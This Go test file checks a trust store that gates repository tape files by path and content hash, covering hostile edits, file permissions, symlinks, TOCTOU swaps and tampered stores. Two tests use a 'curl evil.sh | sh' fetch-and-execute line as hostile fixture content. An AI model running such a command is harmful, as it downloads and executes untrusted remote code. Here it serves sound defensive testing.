package trust

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

// newStore creates a store backed by a temp file, isolated per test.
func newStore(t *testing.T) *Store {
	t.Helper()
	path := filepath.Join(t.TempDir(), "tape-trust.toml")
	s, err := LoadFromPath(path)
	if err != nil {
		t.Fatalf("LoadFromPath: %v", err)
	}
	return s
}

// writeTape writes a 0600 tape file owned by the test user and returns its path.
func writeTape(t *testing.T, dir, content string) string {
	t.Helper()
	path := filepath.Join(dir, TapeFileName)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("writing tape: %v", err)
	}
	return path
}

func hashOf(content string) string {
	sum := sha256.Sum256([]byte(content))
	return hex.EncodeToString(sum[:])
}

// TestLoadCreatesStoreWith0600 checks that a missing store is materialized with
// owner-only permissions.
func TestLoadCreatesStoreWith0600(t *testing.T) {
	path := filepath.Join(t.TempDir(), "tape-trust.toml")
	if _, err := LoadFromPath(path); err != nil {
		t.Fatalf("LoadFromPath: %v", err)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat store: %v", err)
	}
	if runtime.GOOS != "windows" && info.Mode().Perm() != 0o600 {
		t.Fatalf("store perms = %o, want 0600", info.Mode().Perm())
	}
}

// TestUntrustedByDefault: a freshly written, eligible tape is untrusted.
func TestUntrustedByDefault(t *testing.T) {
	s := newStore(t)
	tape := writeTape(t, t.TempDir(), "Type \"echo hi\" Enter\n")

	res, err := s.Check(tape)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if res.Status != StatusUntrusted {
		t.Fatalf("status = %v, want untrusted", res.Status)
	}
	if res.Hash == "" || res.Content == nil {
		t.Fatal("expected a hash and content for an eligible tape")
	}
}

// TestTrustThenTrusted: trusting the (path, hash) makes Check report trusted.
func TestTrustThenTrusted(t *testing.T) {
	s := newStore(t)
	content := "Session \"proj\"\nType \"nvim .\" Enter\n"
	tape := writeTape(t, t.TempDir(), content)

	res, err := s.Check(tape)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if err := s.Trust(res.Path, res.Hash); err != nil {
		t.Fatalf("Trust: %v", err)
	}

	res2, err := s.Check(tape)
	if err != nil {
		t.Fatalf("Check after trust: %v", err)
	}
	if res2.Status != StatusTrusted {
		t.Fatalf("status = %v, want trusted", res2.Status)
	}

	// Trust must survive a reload from disk.
	reloaded, err := LoadFromPath(s.path)
	if err != nil {
		t.Fatalf("reload: %v", err)
	}
	res3, err := reloaded.Check(tape)
	if err != nil {
		t.Fatalf("Check after reload: %v", err)
	}
	if res3.Status != StatusTrusted {
		t.Fatalf("status after reload = %v, want trusted", res3.Status)
	}
}

// TestEditRevertsTrust: editing a trusted tape changes the hash and reverts it
// to untrusted, defeating a maliciously updated repo (threat T2).
func TestEditRevertsTrust(t *testing.T) {
	s := newStore(t)
	dir := t.TempDir()
	tape := writeTape(t, dir, "Type \"npm run dev\" Enter\n")

	res, _ := s.Check(tape)
	if err := s.Trust(res.Path, res.Hash); err != nil {
		t.Fatalf("Trust: %v", err)
	}
	if r, _ := s.Check(tape); r.Status != StatusTrusted {
		t.Fatalf("precondition: status = %v, want trusted", r.Status)
	}

	// The repo's tape is updated with hostile content.
	writeTape(t, dir, "Type \"curl evil.sh | sh\" Enter\n")

	res2, _ := s.Check(tape)
	if res2.Status != StatusUntrusted {
		t.Fatalf("edited tape status = %v, want untrusted", res2.Status)
	}
}

// TestDeniedByPathSurvivesEdit: a denied path stays denied even after its
// content (and thus hash) changes, so a hostile edit cannot re-prompt.
func TestDeniedByPathSurvivesEdit(t *testing.T) {
	s := newStore(t)
	dir := t.TempDir()
	tape := writeTape(t, dir, "Type \"one\" Enter\n")

	res, _ := s.Check(tape)
	if err := s.Deny(res.Path); err != nil {
		t.Fatalf("Deny: %v", err)
	}
	if r, _ := s.Check(tape); r.Status != StatusDenied {
		t.Fatalf("status = %v, want denied", r.Status)
	}

	// Edit the file; a hash-scoped deny would re-prompt here, a path-scoped one
	// must not.
	writeTape(t, dir, "Type \"two, now different\" Enter\n")
	if r, _ := s.Check(tape); r.Status != StatusDenied {
		t.Fatalf("edited denied tape status = %v, want denied", r.Status)
	}

	// Forget returns it to promptable.
	if err := s.Forget(res.Path); err != nil {
		t.Fatalf("Forget: %v", err)
	}
	if r, _ := s.Check(tape); r.Status != StatusUntrusted {
		t.Fatalf("after forget status = %v, want untrusted", r.Status)
	}
}

// TestHygieneWorldWritableIneligible: a world-writable tape can never be
// offered for trust (threat T5).
func TestHygieneWorldWritableIneligible(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permission bits are not meaningful on Windows")
	}
	s := newStore(t)
	dir := t.TempDir()
	tape := writeTape(t, dir, "Type \"echo hi\" Enter\n")
	if err := os.Chmod(tape, 0o666); err != nil {
		t.Fatalf("chmod: %v", err)
	}

	res, _ := s.Check(tape)
	if res.Status != StatusIneligible {
		t.Fatalf("status = %v, want ineligible", res.Status)
	}
	if res.Reason == "" {
		t.Fatal("expected a reason for an ineligible tape")
	}

	// Even an explicit Trust on that path must not make it trusted while the
	// file stays world-writable: eligibility is re-checked on every Check.
	_ = s.Trust(res.Path, hashOf("Type \"echo hi\" Enter\n"))
	if r, _ := s.Check(tape); r.Status != StatusIneligible {
		t.Fatalf("world-writable tape after Trust = %v, want ineligible", r.Status)
	}
}

// TestHygieneGroupWritableIneligible mirrors the above for the group-writable
// bit, which is also disqualifying.
func TestHygieneGroupWritableIneligible(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permission bits are not meaningful on Windows")
	}
	s := newStore(t)
	tape := writeTape(t, t.TempDir(), "Type \"echo hi\" Enter\n")
	if err := os.Chmod(tape, 0o620); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	if r, _ := s.Check(tape); r.Status != StatusIneligible {
		t.Fatalf("group-writable status = %v, want ineligible", r.Status)
	}
}

// TestOversizeIneligible: a tape larger than the cap is ineligible and is not
// slurped whole into Content.
func TestOversizeIneligible(t *testing.T) {
	s := newStore(t)
	big := make([]byte, MaxTapeSize+10)
	for i := range big {
		big[i] = 'a'
	}
	path := filepath.Join(t.TempDir(), TapeFileName)
	if err := os.WriteFile(path, big, 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
	res, _ := s.Check(path)
	if res.Status != StatusIneligible {
		t.Fatalf("status = %v, want ineligible", res.Status)
	}
	if int64(len(res.Content)) > MaxTapeSize {
		t.Fatalf("read %d bytes past the cap; oversize file should not be fully read", len(res.Content))
	}
}

// TestSymlinkResolvesToRealpath: trust keys on the canonical path, so a symlink
// pointing at a trusted target is trusted, and the stored key is the resolved
// path (threat T4 groundwork).
func TestSymlinkResolvesToRealpath(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink semantics differ on Windows")
	}
	s := newStore(t)
	realDir := t.TempDir()
	realTape := writeTape(t, realDir, "Type \"echo real\" Enter\n")

	linkDir := t.TempDir()
	link := filepath.Join(linkDir, TapeFileName)
	if err := os.Symlink(realTape, link); err != nil {
		t.Fatalf("symlink: %v", err)
	}

	res, err := s.Check(link)
	if err != nil {
		t.Fatalf("Check via symlink: %v", err)
	}
	resolved, _ := filepath.EvalSymlinks(realTape)
	if res.Path != resolved {
		t.Fatalf("Path = %q, want resolved realpath %q", res.Path, resolved)
	}

	if err := s.Trust(res.Path, res.Hash); err != nil {
		t.Fatalf("Trust: %v", err)
	}
	// Checking through the symlink again must now report trusted, since it
	// resolves to the same real path that was trusted.
	if r, _ := s.Check(link); r.Status != StatusTrusted {
		t.Fatalf("symlink status after trusting real path = %v, want trusted", r.Status)
	}
}

// TestSingleReadReturnsHashedBytes is the TOCTOU guarantee: Check returns the
// exact bytes it hashed, so a caller (a later run) never has to re-read the
// path. Swapping the file after Check does not change what Check returned.
func TestSingleReadReturnsHashedBytes(t *testing.T) {
	s := newStore(t)
	dir := t.TempDir()
	original := "Type \"safe command\" Enter\n"
	tape := writeTape(t, dir, original)

	res, err := s.Check(tape)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}

	// The bytes handed back must hash to the reported hash.
	if hashOf(string(res.Content)) != res.Hash {
		t.Fatal("Result.Hash is not the hash of Result.Content")
	}
	if string(res.Content) != original {
		t.Fatalf("Content = %q, want the bytes on disk at check time", res.Content)
	}

	// Swap the file's content after the check (the TOCTOU window a later run
	// would face if it re-read the path).
	writeTape(t, dir, "Type \"curl evil.sh | sh\" Enter\n")

	// The already-returned Content is unchanged: a stage-2 run over res.Content
	// would run the reviewed bytes, not the swapped ones.
	if string(res.Content) != original {
		t.Fatal("Result.Content changed after an on-disk swap; it must be an independent buffer")
	}
	if hashOf(string(res.Content)) != res.Hash {
		t.Fatal("Result.Content no longer matches Result.Hash after a swap")
	}
}

// TestTamperedStoreIgnoresContents: a store file with unsafe permissions is not
// trusted. Its entries are dropped and a warning is set, so a planted or
// loosened store cannot silently mark a hostile tape trusted.
func TestTamperedStoreIgnoresContents(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permission bits are not meaningful on Windows")
	}
	// Build a legitimate store that trusts a tape.
	dir := t.TempDir()
	storePath := filepath.Join(dir, "tape-trust.toml")
	s, err := LoadFromPath(storePath)
	if err != nil {
		t.Fatalf("LoadFromPath: %v", err)
	}
	tape := writeTape(t, t.TempDir(), "Type \"echo hi\" Enter\n")
	res, _ := s.Check(tape)
	if err := s.Trust(res.Path, res.Hash); err != nil {
		t.Fatalf("Trust: %v", err)
	}

	// Loosen the store's permissions, as an attacker or a careless sync might.
	if err := os.Chmod(storePath, 0o644); err != nil {
		t.Fatalf("chmod: %v", err)
	}

	reloaded, err := LoadFromPath(storePath)
	if err != nil {
		t.Fatalf("reload: %v", err)
	}
	if reloaded.Warning == "" {
		t.Fatal("expected a warning for a world-readable trust store")
	}
	if r, _ := reloaded.Check(tape); r.Status != StatusUntrusted {
		t.Fatalf("tape trusted by a tampered store = %v, want untrusted (contents ignored)", r.Status)
	}
}

// TestCorruptStoreIgnoresContents: an unparyable store is treated like a
// tampered one rather than crashing.
func TestCorruptStoreIgnoresContents(t *testing.T) {
	storePath := filepath.Join(t.TempDir(), "tape-trust.toml")
	if err := os.WriteFile(storePath, []byte("this is not = valid toml ["), 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
	s, err := LoadFromPath(storePath)
	if err != nil {
		t.Fatalf("LoadFromPath should not error on a corrupt store: %v", err)
	}
	if s.Warning == "" {
		t.Fatal("expected a warning for a corrupt store")
	}
	tape := writeTape(t, t.TempDir(), "Type \"echo hi\" Enter\n")
	if r, _ := s.Check(tape); r.Status != StatusUntrusted {
		t.Fatalf("status with corrupt store = %v, want untrusted", r.Status)
	}
}
